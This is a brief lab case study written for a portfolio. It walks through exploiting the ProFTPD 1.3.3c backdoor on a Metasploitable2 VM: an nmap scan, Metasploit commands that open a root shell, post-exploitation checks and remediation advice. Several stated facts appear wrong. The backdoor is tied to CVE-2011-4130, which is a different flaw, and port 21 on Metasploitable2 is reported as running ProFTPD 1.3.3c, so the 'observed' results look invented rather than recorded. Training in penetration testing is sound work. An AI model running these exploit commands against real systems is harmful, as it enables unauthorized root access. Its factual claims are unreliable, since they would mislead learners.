Case Study: Vulnerability Exploitation Lab

A step-by-step example of vulnerability exploitation and documentation.

Project: ProFTPD Backdoor Exploitation

Objective: Set up Metasploitable2, exploit ProFTPD 1.3.3c using Kali Linux, and document the process for a portfolio.

Environment Setup

  • Hypervisor: VirtualBox 7.0
  • Attacker VM: Kali Linux 2023.3 (192.168.56.101)
  • Target VM: Metasploitable2 (192.168.56.102)
  • Network: Host-Only Adapter
Key Learning

This exercise demonstrates the full lifecycle of a penetration test, from reconnaissance to remediation.

Exploitation Scenario: ProFTPD Backdoor

1. Reconnaissance (Nmap Scan):

nmap -sV 192.168.56.102

Observed: Open port 21 (FTP) running ProFTPD 1.3.3c.

2. Vulnerability Identification:

Searched for "ProFTPD 1.3.3c exploit" and found CVE-2011-4130.

3. Exploitation (Metasploit):

msfconsole
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.168.56.102
exploit

Result: Successfully gained a shell as the `root` user.

4. Post-Exploitation:

whoami
ls -la /root

Observed: Confirmed root access and listed root directory contents.

Remediation & Lessons Learned

Immediate: Upgrade ProFTPD or disable the service.

General: Implement regular vulnerability scanning, apply patches promptly, enforce least privilege.
